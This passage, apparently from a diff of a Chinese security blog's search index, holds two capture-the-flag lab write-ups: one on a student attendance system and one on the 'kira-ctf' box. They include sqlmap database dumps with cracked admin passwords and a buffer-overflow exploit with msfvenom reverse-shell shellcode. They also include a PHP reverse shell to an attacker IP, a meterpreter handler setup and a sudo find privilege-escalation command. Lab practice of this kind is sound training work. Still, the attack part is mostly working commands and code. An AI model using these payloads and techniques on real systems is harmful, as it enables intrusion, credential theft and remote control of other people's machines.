class="line">[*] performance_schema</span><br><span class="line">[*] student_attendance_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 -D "student_attendance_db" --tables</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">+-------------------+</span><br><span class="line">| attendance_list   |</span><br><span class="line">| attendance_record |</span><br><span class="line">| class             |</span><br><span class="line">| class_subject     |</span><br><span class="line">| courses           |</span><br><span class="line">| faculty           |</span><br><span class="line">| students          |</span><br><span class="line">| subjects          |</span><br><span class="line">| system_settings   |</span><br><span class="line">| users             |</span><br><span class="line">+-------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 -D "student_attendance_db" --dump</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: attendance_list</span><br><span class="line">[1 entry]</span><br><span class="line">+----+------------------+------------+---------------------+</span><br><span class="line">| id | class_subject_id | doc        | date_created        |</span><br><span class="line">+----+------------------+------------+---------------------+</span><br><span class="line">| 1  | 1                | 2020-10-28 | 2020-10-28 20:06:37 |</span><br><span class="line">+----+------------------+------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db                                                                                                                                                                                  </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------+------+-------------------+---------------------------------------------+</span><br><span class="line">| id | faculty_id | name          | type | username          | password                                    |</span><br><span class="line">+----+------------+---------------+------+-------------------+---------------------------------------------+</span><br><span class="line">| 1  | 0          | Administrator | 1    | admin             | 0192023a7bbd73250516f069df18b500 (admin123) |</span><br><span class="line">| 2  | 1          | John Smith    | 3    | jsmith@sample.com | af606ddc433ae6471f104872585cf880            |</span><br><span class="line">+----+------------+---------------+------+-------------------+---------------------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: students</span><br><span class="line">[2 entries]</span><br><span class="line">+----+----------+----------+---------------+---------------------+</span><br><span class="line">| id | id_no    | class_id | name          | date_created        |</span><br><span class="line">+----+----------+----------+---------------+---------------------+</span><br><span class="line">| 1  | 06232014 | 2        | Claire Blake  | 2020-10-28 11:53:24 |</span><br><span class="line">| 2  | 123456   | 2        | George Wilson | 2020-10-28 15:20:57 |</span><br><span class="line">+----+----------+----------+---------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: courses</span><br><span class="line">[4 entries]</span><br><span class="line">+----+---------------+---------------+---------------------+</span><br><span class="line">| id | course        | description   | date_created        |</span><br><span class="line">+----+---------------+---------------+---------------------+</span><br><span class="line">| 1  | Sample Course | Sample Course | 2020-10-28 10:00:41 |</span><br><span class="line">| 2  | Course 2      |  Course 2     | 2020-10-28 10:02:09 |</span><br><span class="line">| 3  | Course 3      |  Course 3     | 2020-10-28 10:02:16 |</span><br><span class="line">| 4  | Course 4      |  Course 4     | 2020-10-28 10:02:24 |</span><br><span class="line">+----+---------------+---------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: attendance_record</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------+------+---------------------+</span><br><span class="line">| id | student_id | attendance_id | type | date_created        |</span><br><span class="line">+----+------------+---------------+------+---------------------+</span><br><span class="line">| 1  | 1          | 1             | 1    | 2020-10-28 20:06:37 |</span><br><span class="line">| 2  | 2          | 1             | 2    | 2020-10-28 20:06:37 |</span><br><span class="line">+----+------------+---------------+------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: subjects</span><br><span class="line">[3 entries]</span><br><span class="line">+----+------------+-------------+---------------------+</span><br><span class="line">| id | subject    | description | date_created        |</span><br><span class="line">+----+------------+-------------+---------------------+</span><br><span class="line">| 1  | Subject 1  | Subject 1   | 2020-10-28 10:29:53 |</span><br><span class="line">| 2  | Subject 2  | Subject 2   | 2020-10-28 10:30:48 |</span><br><span class="line">| 3  | Subject 3  | Subject 3   | 2020-10-28 10:30:57 |</span><br><span class="line">+----+------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: faculty</span><br><span class="line">[1 entry]</span><br><span class="line">+----+----------+------------+-------------------+----------------+-------------+---------------------+</span><br><span class="line">| id | id_no    | name       | email             | contact        | address     | date_created        |</span><br><span class="line">+----+----------+------------+-------------------+----------------+-------------+---------------------+</span><br><span class="line">| 1  | 06232014 | John Smith | jsmith@sample.com | +18456-5455-55 | Sample Only | 2020-10-28 11:32:18 |</span><br><span class="line">+----+----------+------------+-------------------+----------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: class_subject</span><br><span class="line">[2 entries]</span><br><span class="line">+----+----------+------------+------------+-------------+---------------------+</span><br><span class="line">| id | class_id | faculty_id | subject_id | student_ids | date_created        |</span><br><span class="line">+----+----------+------------+------------+-------------+---------------------+</span><br><span class="line">| 1  | 2        | 1          | 1          | &lt;blank&gt;     | 0000-00-00 00:00:00 |</span><br><span class="line">| 2  | 1        | 1          | 2          | &lt;blank&gt;     | 0000-00-00 00:00:00 |</span><br><span class="line">+----+----------+------------+------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: system_settings</span><br><span class="line">[1 entry]</span><br><span class="line">+----+---------+---------+---------+----------------------+---------------+</span><br><span class="line">| id | name    | email   | contact | cover_img            | about_content |</span><br><span class="line">+----+---------+---------+---------+----------------------+---------------+</span><br><span class="line">| 1  | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; | 1604743980_shell.php | &lt;blank&gt;       |</span><br><span class="line">+----+---------+---------+---------+----------------------+---------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database: student_attendance_db</span><br><span class="line">Table: class</span><br><span class="line">[3 entries]</span><br><span class="line">+----+-----------+--------+---------+-----------+---------------------+</span><br><span class="line">| id | course_id | status | level   | section   | date_created        |</span><br><span class="line">+----+-----------+--------+---------+-----------+---------------------+</span><br><span class="line">| 1  | 2         | 1      | 1       | B         | 2020-10-28 10:48:45 |</span><br><span class="line">| 2  | 2         | 1      | 1       | A         | 2020-10-28 10:52:58 |</span><br><span class="line">| 3  | 4         | 1      | 8       | 8         | 2021-02-20 05:33:52 |</span><br><span class="line">+----+-----------+--------+---------+-----------+---------------------+</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>md5</code>解密</li>
-</ul>
-<p><img data-src="./school/7.png" alt></p>
-<p>目前的账号密码为:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin / admin123</span><br><span class="line">jsmith@sample.com / 06232014</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>备注:这里登录后发现一些垂直越权问题</li>
-</ul>
-<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><ul>
-<li>前文知道，数据库中有一个系统设置的表(system_settings)</li>
-</ul>
-<p><img data-src="./school/8.png" alt></p>
-<ul>
-<li>找到隐藏文件上传点</li>
-</ul>
-<p><img data-src="./school/9.png" alt></p>
-<p><img data-src="./school/10.png" alt></p>
-<ul>
-<li>反弹<code>shell</code></li>
-</ul>
-<p><img data-src="./school/11.png" alt></p>
-<p><img data-src="./school/12.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./school/13.png" alt></p>
-<h3 id="后台shell"><a href="#后台shell" class="headerlink" title="后台shell"></a>后台shell</h3><p><img data-src="./school/14.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">e4ed03b4852906b6cb716fc6ce0f9fd5 (失败) 这是第一个flag</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>第二个 <code>flag</code></li>
-</ul>
-<p><img data-src="./school/15.png" alt></p>
-<p>突破口出在这个 <code>wine /opt/access/access.exe</code> 上面</p>
-<p><img data-src="./school/16.png" alt></p>
-<p>脱下来参考网上<code>exp</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 生成shellcode</span></span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.106 LPORT=4444 -b '\x00\x0a\x4d\x4f\x5f\x79\x7e\x7f' -f python</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"># exp.py</span><br><span class="line">import socket</span><br><span class="line">buf&#x3D;b&#39;&#39;</span><br><span class="line">target_ip&#x3D;&#39;192.168.1.102&#39;</span><br><span class="line">target_port&#x3D;23</span><br><span class="line">recv_buf&#x3D;4096</span><br><span class="line">junk &#x3D; b&#39;a&#39; * 1902</span><br><span class="line">ret_addr&#x3D;b&#39;\xd0\x12\x50\x62&#39;</span><br><span class="line">#nops&#x3D;b&#39;\x90&#39;*32   可选</span><br><span class="line">buf +&#x3D; b&quot;\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x76\x0e\xf0\xea\x7a\x82\x83\xee\xfc\xe2\xf4\x0c\x02&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xf8\x82\xf0\xea\x1a\x0b\x15\xdb\xba\xe6\x7b\xba\x4a&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x09\xa2\xe6\xf1\xd0\xe4\x61\x08\xaa\xff\x5d\x30\xa4&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xc1\x15\xd6\xbe\x91\x96\x78\xae\xd0\x2b\xb5\x8f\xf1&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x2d\x98\x70\xa2\xbd\xf1\xd0\xe0\x61\x30\xbe\x7b\xa6&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x6b\xfa\x13\xa2\x7b\x53\xa1\x61\x23\xa2\xf1\x39\xf1&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xcb\xe8\x09\x40\xcb\x7b\xde\xf1\x83\x26\xdb\x85\x2e&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x31\x25\x77\x83\x37\xd2\x9a\xf7\x06\xe9\x07\x7a\xcb&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x97\x5e\xf7\x14\xb2\xf1\xda\xd4\xeb\xa9\xe4\x7b\xe6&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x31\x09\xa8\xf6\x7b\x51\x7b\xee\xf1\x83\x20\x63\x3e&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xa6\xd4\xb1\x21\xe3\xa9\xb0\x2b\x7d\x10\xb5\x25\xd8&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x7b\xf8\x91\x0f\xad\x82\x49\xb0\xf0\xea\x12\xf5\x83&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xd8\x25\xd6\x98\xa6\x0d\xa4\xf7\x15\xaf\x3a\x60\xeb&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x7a\x82\xd9\x2e\x2e\xd2\x98\xc3\xfa\xe9\xf0\x15\xaf&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xd2\xa0\xba\x2a\xc2\xa0\xaa\x2a\xea\x1a\xe5\xa5\x62&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x0f\x3f\xed\xe8\xf5\x82\xba\x2a\xf1\x80\x12\x80\xf0&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xfb\x26\x0b\x16\x80\x6a\xd4\xa7\x82\xe3\x27\x84\x8b&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x85\x57\x75\x2a\x0e\x8e\x0f\xa4\x72\xf7\x1c\x82\x8a&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x37\x52\xbc\x85\x57\x98\x89\x17\xe6\xf0\x63\x99\xd5&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xa7\xbd\x4b\x74\x9a\xf8\x23\xd4\x12\x17\x1c\x45\xb4&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xce\x46\x83\xf1\x67\x3e\xa6\xe0\x2c\x7a\xc6\xa4\xba&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x2c\xd4\xa6\xac\x2c\xcc\xa6\xbc\x29\xd4\x98\x93\xb6&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xbd\x76\x15\xaf\x0b\x10\xa4\x2c\xc4\x0f\xda\x12\x8a&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x77\xf7\x1a\x7d\x25\x51\x8a\x37\x52\xbc\x12\x24\x65&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x57\xe7\x7d\x25\xd6\x7c\xfe\xfa\x6a\x81\x62\x85\xef&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xc1\xc5\xe3\x98\x15\xe8\xf0\xb9\x85\x57&quot;  </span><br><span class="line">payload &#x3D; b&#39;&#39;</span><br><span class="line">payload +&#x3D; junk</span><br><span class="line">payload +&#x3D; ret_addr</span><br><span class="line">#payload +&#x3D; nops</span><br><span class="line">payload +&#x3D; buf</span><br><span class="line">with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as clientSock:</span><br><span class="line">    clientSock.connect((target_ip,target_port))    </span><br><span class="line">    data_from_srv &#x3D; clientSock.recv(recv_buf)    </span><br><span class="line">    print(f&quot;Reply --&gt; &#123;data_from_srv&#125;&quot;)    </span><br><span class="line">    print(f&quot;Sending --&gt; &#123;payload&#125;&quot;)    </span><br><span class="line">    clientSock.sendall(payload)</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./school/17.png" alt></p>
-<p><img data-src="./school/18.png" alt></p>
-<p><img data-src="./school/19.png" alt></p>
-<p>ok!</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>other</category>
-      </categories>
-      <tags>
-        <tag>入门</tag>
-        <tag>综合靶场测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kira-ctf</title>
-    <url>/2021/01/10/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/kira-ctf/</url>
-    <content><![CDATA[<h1 id="kira-ctf"><a href="#kira-ctf" class="headerlink" title="kira-ctf"></a>kira-ctf</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
-<a id="more"></a>
-
-<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
-<li>kali2020</li>
-<li>kira-ctf</li>
-<li>windows10</li>
-</ul>
-<h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    f2:19:51:a3:22:a0       (Unknown: locally administered)</span><br><span class="line">192.168.43.43   08:00:27:33:75:54       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.994 seconds (128.39 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>目标为 192.168.43.43</li>
-<li>NMAP</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.43</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-10 01:33 EST</span><br><span class="line">Nmap scan report for 192.168.43.43</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:33:75:54 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                                                                               </span><br><span class="line">TCP/IP fingerprint:                                                                                                                                                                                               </span><br><span class="line">OS:SCAN(V=7.80%E=4%D=1/10%OT=80%CT=1%CU=40204%PV=Y%DS=1%DC=D%G=Y%M=080027%T                                                                                                                                       </span><br><span class="line">OS:M=5FFA9FD3%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I                                                                                                                                       </span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O                                                                                                                                       </span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6                                                                                                                                       </span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O                                                                                                                                       </span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=                                                                                                                                       </span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%                                                                                                                                       </span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(                                                                                                                                       </span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=                                                                                                                                       </span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.32 ms 192.168.43.43</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.69 seconds</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>目录扫描</li>
-</ul>
-<p><img data-src="./kira-ctf/1.png" alt></p>
-<h3 id="web登录"><a href="#web登录" class="headerlink" title="web登录"></a>web登录</h3><p><img data-src="./kira-ctf/2.png" alt></p>
-<ul>
-<li>继续进行测试</li>
-</ul>
-<p><img data-src="./kira-ctf/3.png" alt></p>
-<p><img data-src="./kira-ctf/4.png" alt></p>
-<p>比较清晰，一个文件上传+一个文件包含</p>
-<p><img data-src="./kira-ctf/5.png" alt></p>
-<h3 id="图片马-LFI-拿shell"><a href="#图片马-LFI-拿shell" class="headerlink" title="图片马+LFI 拿shell"></a>图片马+LFI 拿shell</h3><p><img data-src="./kira-ctf/6.png" alt></p>
-<ul>
-<li><p>成功利用</p>
-</li>
-<li><p>服务器写马</p>
-</li>
-</ul>
-<p><img data-src="./kira-ctf/7.png" alt></p>
-<p>发现写不进去马，应该是 服务器没权限写文件</p>
-<p>换一种方式，用php反弹shell</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sock=fsockopen(<span class="string">"192.168.43.86"</span>,<span class="number">7777</span>);exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>发现反弹失败</li>
-</ul>
-<p><img data-src="./kira-ctf/8.png" alt></p>
-<ul>
-<li>用<code>msfvenom</code>工具生成木马</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.43.86 lport=7777 -o ./ma.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> lhost后的地址为kali攻击机的地址</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> lport后的端口号为后续监听端口号</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -o后面为木马生成地址。</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./kira-ctf/9.png" alt></p>
-<ul>
-<li><code>msf</code>大法</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.43.86     # 本机ip</span><br><span class="line">set lport 7777       # 与前面的木马中的1234端口一致</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./kira-ctf/10.png" alt></p>
-<p><img data-src="./kira-ctf/11.png" alt></p>
-<p><img data-src="./kira-ctf/12.png" alt></p>
-<p>发现账户密码</p>
-<ul>
-<li>交互shell 后 su</li>
-</ul>
-<p><img data-src="./kira-ctf/13.png" alt></p>
-<ul>
-<li><code>find</code>提权</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo find bassam-pass.txt -exec "/bin/sh" \;</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./kira-ctf/14.png" alt></p>
-<p><img data-src="./kira-ctf/15.png" alt></p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>入门</tag>
-        <tag>综合靶场测试</tag>
       </tags>
   </entry>
 </search>
